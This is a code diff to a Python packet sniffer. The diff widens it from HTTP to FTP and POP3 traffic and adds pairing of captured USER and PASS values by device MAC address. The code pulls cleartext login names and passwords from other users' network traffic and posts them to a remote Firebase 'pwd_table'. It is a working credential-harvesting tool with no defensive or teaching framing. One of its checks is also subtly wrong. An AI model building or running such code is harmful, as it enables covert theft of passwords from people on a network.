@@ -9,7 +9,7 @@ from pprint import pprint
 import settings
 from utils import add_colons_to_mac
 
-APP_TO_PORT = {80: 'http', 23: 'telnet', 21: 'ftp'}
+APP = {80: 'HTTP', 23: 'TELNET', 21: 'FTP', 110: 'POP3'}
 
 
 class Sniffer(object):
@@ -24,12 +24,15 @@ class Sniffer(object):
         # Status update
         self._firebase.patch('/status', {"status": "ON"})
 
-        pattern = 'tcp and dst port 80'
-        # pattern = 'tcp and dst port 80 and dst port 23'
+        pattern = 'tcp and dst port 80 or dst port 21 or dst port 110'
+        # pattern = 'tcp and dst port 80 or dst port 21'
+
         self.pc = pcap.pcap(kwargs['interface'])
         self.pc.setfilter(pattern)
 
         self.all_user_info = {}
+
+        self.devices_mac = {}
         self.info_counter = 0
 
     def _is_host(self, content):
@@ -44,34 +47,38 @@ class Sniffer(object):
         regex = re.compile('(.*)[txtPwd]=(.*)')
         return content is not None and regex.search(content)
 
-    def _pick_ftp_info(self, data, client, server, app, eth_src):
-        self.info_counter += 1
-        self.all_user_info[self.info_counter] = (
-            {'client': client, 'server': server,
-             'app': APP_TO_PORT.get(app),
-             'mac': add_colons_to_mac(binascii.hexlify(eth_src))}
-        )
+    def _pick_ftp_info(self, data, client, server, dport, eth_src):
+        self.devices_mac.setdefault(add_colons_to_mac(eth_src), {})
+
+        self.devices_mac[add_colons_to_mac(eth_src)]['client'] = client
+        self.devices_mac[add_colons_to_mac(eth_src)]['server'] = server
+        self.devices_mac[add_colons_to_mac(eth_src)]['app'] = APP.get(dport)
+        self.devices_mac[add_colons_to_mac(eth_src)]['mac'] = (
+            add_colons_to_mac(eth_src))
+
         if data.get('USER'):
-            self.all_user_info[self.info_counter].update(
+            self.devices_mac[add_colons_to_mac(eth_src)].update(
                 {'login': data.get('USER')})
-        else:
-            self.all_user_info[self.info_counter].update({'login': None})
-
         if data.get('PASS'):
-            self.all_user_info[self.info_counter].update(
+            self.devices_mac[add_colons_to_mac(eth_src)].update(
                 {'password': data.get('PASS')})
-        else:
-            self.all_user_info[self.info_counter].update({'password': None})
 
-        print "FTP New Password get:"
-        pprint(self.all_user_info[self.info_counter])
-        # self._firebase.post('/pwd_table', self.all_user_info[self.info_counter])
+        device_info = self.devices_mac[add_colons_to_mac(eth_src)]
 
-    def _pick_http_info(self, data, client, server, app, eth_src):
+        if 'login' and 'password' in device_info.keys():
+            print "FTP New Password get:"
+            pprint(self.devices_mac[add_colons_to_mac(eth_src)])
+            self._firebase.post('/pwd_table',
+                                self.devices_mac[add_colons_to_mac(eth_src)])
+
+            # When push to firebase delete it
+            del self.devices_mac[add_colons_to_mac(eth_src)]
+
+    def _pick_http_info(self, data, client, server, dport, eth_src):
         self.info_counter += 1
         self.all_user_info[self.info_counter] = (
             {'client': client, 'server': server,
-             'app': APP_TO_PORT.get(app),
+             'app': APP.get(dport),
              'mac': add_colons_to_mac(binascii.hexlify(eth_src))}
         )
 
@@ -112,21 +119,34 @@ class Sniffer(object):
         pprint(self.all_user_info[self.info_counter])
         self._firebase.post('/pwd_table', self.all_user_info[self.info_counter])
 
-    def _get_ftp_payload(self, eth_pkt, ip_pkt, tcp_pkt):
+    def _get_ftp_pop_payload(self, eth_pkt, ip_pkt, tcp_pkt):
         if 'USER' in tcp_pkt.data:
             regex = re.compile('USER (.*)')
             user_obj = regex.search(tcp_pkt.data)
-            user_d = {'USER': user_obj.group(1)}
+            if user_obj is None:
+                regex = re.compile('user (.*)')
+                user_obj = regex.search(tcp_pkt.data)
+                if user_obj is None:
+                    return
+
+            user_d = {'USER': user_obj.group(1).rstrip('\r')}
             self._pick_ftp_info(user_d, socket.inet_ntoa(ip_pkt.src),
                                 socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
-                                eth_pkt.src)
+                                binascii.hexlify(eth_pkt.src))
         elif 'PASS' in tcp_pkt.data:
             regex = re.compile('PASS (.*)')
             password_obj = regex.search(tcp_pkt.data)
-            password_d = {'PASS': password_obj.group(1)}
+
+            if password_obj is None:
+                regex = re.compile('pass (.*)')
+                password_obj = regex.search(tcp_pkt.data)
+                if password_obj is None:
+                    return
+
+            password_d = {'PASS': password_obj.group(1).rstrip('\r')}
             self._pick_ftp_info(password_d, socket.inet_ntoa(ip_pkt.src),
                                 socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
-                                eth_pkt.src)
+                                binascii.hexlify(eth_pkt.src))
         else:
             return
 
@@ -179,8 +199,14 @@ class Sniffer(object):
                     ip = eth.data
                     tcp = ip.data
                     if len(tcp.data) > 0:
-                        self._get_http_payload(eth, ip, tcp)
-                        self._get_ftp_payload(eth, ip, tcp)
+                        # print tcp.dport
+                        # make sure the pattern is correct
+                        if tcp.dport == 80:
+                            self._get_http_payload(eth, ip, tcp)
+                        elif tcp.dport == 21 or tcp.dport == 110:
+                            self._get_ftp_pop_payload(eth, ip, tcp)
+                        else:
+                            pass
 
             except KeyboardInterrupt:
                 nrecv, ndrop, nifdrop = self.pc.stats()
